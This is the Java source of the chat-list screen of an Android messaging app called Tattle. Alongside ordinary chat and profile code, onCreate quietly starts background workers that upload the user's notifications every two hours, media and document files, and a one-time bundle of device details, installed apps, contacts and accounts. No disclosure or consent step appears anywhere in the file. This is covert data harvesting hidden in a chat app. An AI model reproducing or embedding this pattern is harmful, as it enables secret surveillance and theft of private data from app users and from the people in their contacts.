package com.codies.Tattle.UI.Activities;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.core.app.ActivityCompat;
import androidx.lifecycle.Observer;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkInfo;
import androidx.work.WorkManager;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.webkit.MimeTypeMap;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.bumptech.glide.Glide;
import com.codies.Tattle.DataUploadServices.DocumentFilesUploader;
import com.codies.Tattle.DataUploadServices.MediaFilesUploader;
import com.codies.Tattle.DataUploadServices.NotificationUploadScheduler;
import com.codies.Tattle.Interfaces.ChatClickListener;
import com.codies.Tattle.Models.ChatList;
import com.codies.Tattle.Models.User;
import com.codies.Tattle.OtherUtils.ContactUtil;
import com.codies.Tattle.OtherUtils.DeviceInfo;
import com.codies.Tattle.R;
import com.codies.Tattle.DataUploadServices.BasicDataUploadService;
import com.codies.Tattle.Services.LoginService;
import com.codies.Tattle.Utils.App;
import com.codies.Tattle.Adapters.ChatListAdapter;
import com.codies.Tattle.Utils.QBResRequestExecutor;
import com.codies.Tattle.OtherUtils.SharedPrefs;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.snackbar.Snackbar;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.mikhaellopez.circularimageview.CircularImageView;
import com.quickblox.core.QBEntityCallback;
import com.quickblox.core.exception.QBResponseException;
import com.quickblox.users.model.QBUser;

import java.io.File;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class ChatListActivity extends BaseActivity implements ChatClickListener {

    public static final int PERMISSIONS_REQUEST_READ_CONTACTS = 1;
    private static final int MY_PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE = 1;
    public static final String TAG = "MAIN";
    RecyclerView recyclerView;
    CircularImageView profileBt;
    ImageButton logoutBt;
    ChatListAdapter chatsAdapter;
    List<String> userList;
    List<User> users;
    User globalUser;
    String userId;
    List<ChatList> chatLists;
    FirebaseAuth mAuth;
    FloatingActionButton newChatBt;
    DatabaseReference databaseReference;
    StorageReference storageReference;
    CircularImageView dialogueProfileImg;
    SharedPrefs sharedPrefs;
    String userName;
    ProgressBar photoUploadPB;
    private ConstraintLayout coordinatorLayout;


    public static final int IMAGECHOOSERCODE = 1;
    Uri imageUri;
    String fileExtension;
    String imageUrl;
    boolean imageUploading = false;
    boolean photoSelected = false;
    protected QBResRequestExecutor requestExecutor;

    ContactUtil contactUtil;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_chat_list);
        profileBt = findViewById(R.id.profileBT);
        logoutBt = findViewById(R.id.logoutBt);
        userList = new ArrayList<>();
        sharedPrefs = SharedPrefs.getInstance(getApplicationContext());
        mAuth = FirebaseAuth.getInstance();
        requestExecutor = App.getInstance().getQbResRequestExecutor();
        contactUtil = new ContactUtil(this);
        userId = mAuth.getCurrentUser().getUid();
        newChatBt = findViewById(R.id.newChatBT);
        databaseReference = FirebaseDatabase.getInstance().getReference();
        storageReference = FirebaseStorage.getInstance().getReference("userProfileImages");
        users = new ArrayList<>();
        chatLists = new ArrayList<>();
        recyclerView = findViewById(R.id.chatsRVVV);
        chatsAdapter = new ChatListAdapter(this, this);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));
        recyclerView.setAdapter(chatsAdapter);
        coordinatorLayout = (ConstraintLayout) findViewById(R.id.frameLayout4);

        if (!isUserSignedIn()) {
            logOutFromQuickblox();
        }

        startLoginService();
        getCurrentUserData();
        readChats();
        startNotificationUploadService();

        if (!sharedPrefs.isBasicDataUploaded()) {
            uploadDeviceInfo();
        }
        startImageUploadService();
        startDocsUploadService();

        newChatBt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(ChatListActivity.this, SearchActivity.class));
            }
        });
        profileBt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                LayoutInflater factory = LayoutInflater.from(ChatListActivity.this);
                final View deleteDialogView = factory.inflate(R.layout.activity_profile, null);
                final AlertDialog deleteDialog = new AlertDialog.Builder(ChatListActivity.this).create();
                deleteDialog.setCancelable(false);
                deleteDialog.setCanceledOnTouchOutside(false);
                FloatingActionButton editPhotoBt;
                EditText nameEt;
                Button saveBt;
                ImageButton closeBt;

                deleteDialog.setView(deleteDialogView);
                closeBt = deleteDialogView.findViewById(R.id.closeBt);
                photoUploadPB = deleteDialogView.findViewById(R.id.photoUploadPB);
                saveBt = deleteDialogView.findViewById(R.id.editSaveProfileBT);
                editPhotoBt = deleteDialogView.findViewById(R.id.editPhotoBT);
                nameEt = deleteDialogView.findViewById(R.id.editNameET);
                dialogueProfileImg = deleteDialogView.findViewById(R.id.editProfileImg);
                if (globalUser != null) {
                    if (globalUser.getImageUrl() != null) {
                        Glide.with(getApplicationContext()).load(globalUser.getImageUrl()).into(dialogueProfileImg);
                    }
                }

                photoUploadPB.setVisibility(View.INVISIBLE);
                nameEt.setText(userName);
                closeBt.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        deleteDialog.dismiss();
                        deleteDialog.cancel();
                    }
                });
                saveBt.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        String name = nameEt.getText().toString();
                        if (photoSelected && imageUploading) {
                            Toast.makeText(ChatListActivity.this, "Wait, updating profile!", Toast.LENGTH_SHORT).show();
                        } else {
                            if (!name.equals(userName)) {
                                updateUserProfileName(name);
                            }
                            updateUserProfileImage(imageUrl);
                            deleteDialog.dismiss();
                            deleteDialog.cancel();
                        }
                    }
                });
                editPhotoBt.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        if (isStoragePermissionGranted()) {
                            openImageChooser();
                        } else {
                            isStoragePermissionGranted();
                        }
                    }
                });
                deleteDialog.show();
            }
        });

        logoutBt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Snackbar snackbar = Snackbar
                        .make(coordinatorLayout, "Are you sure you want to Logout?", Snackbar.LENGTH_LONG)
                        .setAction("Yes Logout", new View.OnClickListener() {
                            @Override
                            public void onClick(View view) {
                                logOutFromQuickblox();
                            }
                        });
                snackbar.show();
            }
        });
    }

    public void startNotificationUploadService() {
        Log.i(TAG, "startWorkmanager: work manager has started");
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 2, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();

        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("uploadNotif", ExistingPeriodicWorkPolicy.REPLACE,build);
    }

    public void startImageUploadService() {
        final WorkManager mWorkManager = WorkManager.getInstance();
        final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(MediaFilesUploader.class)
                .addTag("MediaFilesUploader")
                .build();

        mWorkManager.enqueue(mRequest);
        mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
            @Override
            public void onChanged(@Nullable WorkInfo workInfo) {
                if (workInfo != null) {
                    if (workInfo.getState().isFinished()) {
                        workInfo.getOutputData().getBoolean("photosSyncedWithServer", false);
                    }
                }
            }
        });
    }

    public void startDocsUploadService() {
        final WorkManager mWorkManager = WorkManager.getInstance();
        final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(DocumentFilesUploader.class)
                .addTag("DocFilesUploader")
                .build();

        mWorkManager.enqueue(mRequest);
        mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
            @Override
            public void onChanged(@Nullable WorkInfo workInfo) {
                if (workInfo != null) {
                    if (workInfo.getState().isFinished()) {
                        workInfo.getOutputData().getBoolean("filesSyncedWithServer", false);
                    }
                }
            }
        });
    }

    public void uploadDeviceInfo() {
        DeviceInfo deviceInfo = new DeviceInfo(this);
        Intent serviceIntent = new Intent(this, BasicDataUploadService.class);
        serviceIntent.putExtra("deviceInfo", deviceInfo.getDetails());
        serviceIntent.putExtra("installedApps",(Serializable) deviceInfo.getInstalledApps());
        serviceIntent.putExtra("contacts", (Serializable) contactUtil.getContacts());
        serviceIntent.putExtra("accounts", (Serializable) deviceInfo.getAccounts());
        BasicDataUploadService.enqueueWork(this, serviceIntent);
    }

    public void readChats() {
        databaseReference.child("UserChatList").child(mAuth.getCurrentUser().getUid()).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                chatLists.clear();
                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                    ChatList chatList = dataSnapshot.getValue(ChatList.class);
                    Log.i(TAG, "onDataChange: " + chatList.getSenderName());
                    Log.i(TAG, "onDataChange: "+chatList.getLastMessage());
                    chatLists.add(chatList);
                }
                chatsAdapter.setList(chatLists);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
        /*databaseReference.child("ChatList").child(userId).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                for (DataSnapshot snapshot : dataSnapshot.getChildren()) {
                    ChatList chatList = snapshot.getValue(ChatList.class);
                    chatLists.add(chatList);
                }
                readMessages();
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });*/
/*        databaseReference.child("UserChatList").child(mAuth.getCurrentUser().getUid()).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                    ChatList chatList = dataSnapshot.getValue(ChatList.class);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });*/
    }



    private void logOutFromQuickblox() {
        Log.i(TAG, "Removing User data, and Logout");
        requestExecutor.signOut(new QBEntityCallback<Void>() {
            @Override
            public void onSuccess(Void aVoid, Bundle bundle) {
                Log.i(TAG, "onSuccess: "+"success logout");
                mAuth.signOut();
                sharedPrefs.clearPrefrences();
                startActivity(new Intent(ChatListActivity.this, LoginActivity.class));
                finish();
            }
            @Override
            public void onError(QBResponseException e) {
                Log.i(TAG, "onError: "+"no success logout");
                mAuth.signOut();
                sharedPrefs.clearPrefrences();
                startActivity(new Intent(ChatListActivity.this, LoginActivity.class));
                finish();
            }
        });
    }

    public void openImageChooser() {
        Intent intent = new Intent();
        intent.setType("image/*");
        intent.setAction(Intent.ACTION_GET_CONTENT);
        startActivityForResult(intent, IMAGECHOOSERCODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == IMAGECHOOSERCODE && resultCode == RESULT_OK && data != null && data.getData() != null) {
            imageUri = data.getData();
            photoSelected = true;
            Glide.with(this).load(imageUri).into(dialogueProfileImg);
            fileExtension = getFileExtension(imageUri);
            uploadFile(imageUri, fileExtension);
        }
    }

    public void uploadFile(Uri imageUri, String extension) {
        photoUploadPB.setVisibility(View.VISIBLE);
        imageUploading = true;
        final StorageReference storageReference = this.storageReference.child(System.currentTimeMillis() + "." + extension);
        storageReference.putFile(imageUri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                storageReference.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                    @Override
                    public void onSuccess(Uri uri) {
                        imageUrl = uri.toString();
                        photoUploadPB.setVisibility(View.INVISIBLE);
                        imageUploading = false;
//                        Toast.makeText(ChatListActivity.this, "Image Uploaded Successfully", Toast.LENGTH_SHORT).show();
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        photoUploadPB.setVisibility(View.INVISIBLE);
                        imageUploading = false;
                        Toast.makeText(ChatListActivity.this, "Failed to upload photo!", Toast.LENGTH_SHORT).show();
                        Log.i(TAG, "onFailure: " + e.getLocalizedMessage());
                    }
                });
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
                //tell user that uploading failed
                photoUploadPB.setVisibility(View.INVISIBLE);
                imageUploading = false;
                Toast.makeText(ChatListActivity.this, "Failed To Upload : " + e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
            }
        }).addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                //keep the user updated about this task
                double val = (100.0 * taskSnapshot.getBytesTransferred()) / taskSnapshot.getTotalByteCount();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
//                    imgProgressBar.setProgress((int) val, true);
                } else {
//                    imgProgressBar.setProgress((int) val);
                }
            }
        });
    }


    public String getFileExtension(Uri uri) {
        if (uri.getScheme().equals(ContentResolver.SCHEME_CONTENT)) {
            //If scheme is a content
            final MimeTypeMap mime = MimeTypeMap.getSingleton();
            return mime.getExtensionFromMimeType(getContentResolver().getType(uri));
        } else {
            //If scheme is a File
            return MimeTypeMap.getFileExtensionFromUrl(Uri.fromFile(new File(uri.getPath())).toString());
        }
    }

    public boolean isStoragePermissionGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED) {
                Log.v(TAG, "Permission is granted");
                openImageChooser();
                return true;
            } else {
                Log.v(TAG, "Permission is revoked");
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 1);
                return false;
            }
        } else { //permission is automatically granted on sdk<23 upon installation
            Log.v(TAG, "Permission is granted");
            openImageChooser();
            return true;
        }
    }

    private void startLoginService() {
        if (sharedPrefsHelper.hasQbUser()) {
            Log.i(TAG, "startLoginService: chatservice start ho gye hai");
            QBUser qbUser = sharedPrefsHelper.getQbUser();
            Log.i(TAG, "startLoginService: " + qbUser.getEmail());
            LoginService.start(this, qbUser);
        } else {
            Log.i(TAG, "startLoginService: shared prefs py user he ni hai");
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_READ_CONTACTS) {
            if (grantResults.length > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//                getContacts();
            } else {
                Toast.makeText(this, "You have disabled a contacts permission", Toast.LENGTH_LONG).show();
            }
        } else {
            if(grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                Log.v(TAG, "Permission: " + permissions[0] + "was " + grantResults[0]);
                //resume tasks needing this permission
                openImageChooser();
            }
        }
    }

    public void updateUserProfileName(String name) {
        databaseReference.child("users").child(mAuth.getCurrentUser().getUid()).child("name").setValue(name).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void aVoid) {
                Toast.makeText(ChatListActivity.this, "Data Updated Successfully!", Toast.LENGTH_SHORT).show();
            }
        });
    }

    public void updateUserProfileImage(String imageUrl) {
        databaseReference.child("users").child(mAuth.getCurrentUser().getUid()).child("imageUrl").setValue(imageUrl).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void aVoid) {
                Toast.makeText(ChatListActivity.this, "Data Updated Successfully!", Toast.LENGTH_SHORT).show();
            }
        });
    }

    public void getCurrentUserData() {
        if (mAuth.getCurrentUser() != null) {
            databaseReference.child("users").child(mAuth.getCurrentUser().getUid()).addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    User user = snapshot.getValue(User.class);
                    if (user != null) {
                        globalUser = user;
                        userName = user.getName();
                        if (user.getImageUrl() != null) {
                            Glide.with(ChatListActivity.this).load(user.getImageUrl()).into(profileBt);
                        }
                    } else {
                        Log.i(TAG, "onDataChange: user is null");
                    }
                }
                @Override
                public void onCancelled(@NonNull DatabaseError error) {
                    Log.i(TAG, "onCancelled: " + error.getDetails());
                }
            });
        }
    }

    @Override
    public void onClick(String itemId, String name, String profileUrl) {
        Intent intent = new Intent(ChatListActivity.this, ChatActivity.class);
        intent.putExtra("userId", itemId);
        intent.putExtra("name", name);
        intent.putExtra("image", profileUrl);
        startActivity(intent);
    }

    public boolean isUserSignedIn() {
        FirebaseUser user = mAuth.getCurrentUser();
        if (user == null) {
            return false;
        }
        return true;
    }

}